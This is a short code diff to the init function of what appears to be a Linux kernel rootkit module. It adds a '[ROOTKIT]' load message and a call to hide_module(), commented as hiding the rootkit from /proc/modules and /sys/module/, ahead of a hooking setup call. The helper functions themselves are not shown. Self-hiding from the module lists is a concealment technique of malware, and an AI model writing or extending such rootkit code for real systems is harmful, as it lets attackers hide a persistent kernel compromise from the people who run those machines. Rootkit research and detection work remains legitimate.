@@ -27,6 +27,11 @@ static int __init rootkit_init(void)
 {
     int i_err;
 
+    pr_info("[ROOTKIT] Module loading...\n");
+
+    // Hide the rootkit from /proc/modules and /sys/module/
+    hide_module();
+
     // Initialize hooking
     i_err = init_hooking();
 
